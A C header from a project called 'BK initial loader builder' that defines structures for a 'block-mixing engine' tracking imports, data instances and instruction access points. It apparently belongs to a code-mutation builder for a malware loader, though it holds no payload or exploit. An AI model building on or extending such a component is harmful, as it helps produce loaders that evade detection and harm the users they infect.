//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BK initial loader builder. Version 2.9.2
//	
// module: instance.h
// $Revision: 39 $
// $Date: 2012-05-02 15:38:09 +0400 (Ср, 02 май 2012) $
// description:
//	Block-mixing engine implementation.


// Describes imported function
typedef struct _IMPORT_DESCRIPTOR
{
#if _DEBUG
	ULONG		Magic;
#endif
	LIST_ENTRY	Entry;
	PCHAR		ModuleName;		// name of the imported module
	PCHAR		FunctionName;	// name of the imported function
	INT			InstanceId;		// function ID for internal use, must be unique, mask = 0xffffff, first 255 are reserved
	ULONG		IatEntryRva;	// RVA of the IAT entry for current module
} IMPORT_DESCRIPTOR, *PIMPORT_DESCRIPTOR;

#define		IMPORT_DESCRIPTOR_MAGIC		'SEDI'
#define		ASSERT_IMPORT_DESCRIPTOR(x)		ASSERT(x->Magic == IMPORT_DESCRIPTOR_MAGIC)


// Describes single unique data instance. Can be function, variable, constant etc.
// Any data instance can be accessed multiple times. All access points described by the AccessListHead list.
typedef struct _DATA_INSTANCE
{
	LIST_ENTRY			InstanceListEntry;	// links to list of multiple instances of the same type
	LIST_ENTRY			AccessListHead;		// list of ACCESS_DESCRIPTORs for the instance
	PIMPORT_DESCRIPTOR	ImportDesc;			// imported function descriptor (for import)
	INT					InstanceId;			// unique instance ID
	ULONG				AccessCount;		// number of access descriprots in the list above
	ULONG				InstanceFlags;		// variouse flags
} DATA_INSTANCE, *PDATA_INSTANCE;

// Describes any accessed data: called function, variable, constant etc.
typedef struct _ACCESS_DESCRIPTOR
{
	LIST_ENTRY	Entry;
	ULONG		Instruction;	// offset of the instruction that accesses variable
	ULONG		Length;			// the instruction length in bytes
	ULONG		Pointer;		// offset or value of the variable
	ULONG		Flags;			// variuose flags
}ACCESS_DESCRIPTOR, *PACCESS_DESCRIPTOR;




BOOL	InstanceListAdd(PLIST_ENTRY	InstanceListHead, PDATA_INSTANCE NewInstance);
BOOL	AllocateInstance(PCHAR Block, PCHAR Instruction, PLIST_ENTRY InstanceListHead, ULONG IndexMask,	ULONG InstanceType, ULONG Flags);

#define AllocateConstant(Block, Instruction, ConstListHead, Flags)	\
	AllocateInstance(Block, Instruction, ConstListHead, CONST_INDEX_MASK, INSTANCE_TYPE_CONSTANT, Flags)

#define AllocateCRef(Block, Instruction, CRefListHead, Flags)	\
	AllocateInstance(Block, Instruction, CRefListHead, OUTCALL_INDEX_MASK, INSTANCE_TYPE_OUTCALL, Flags)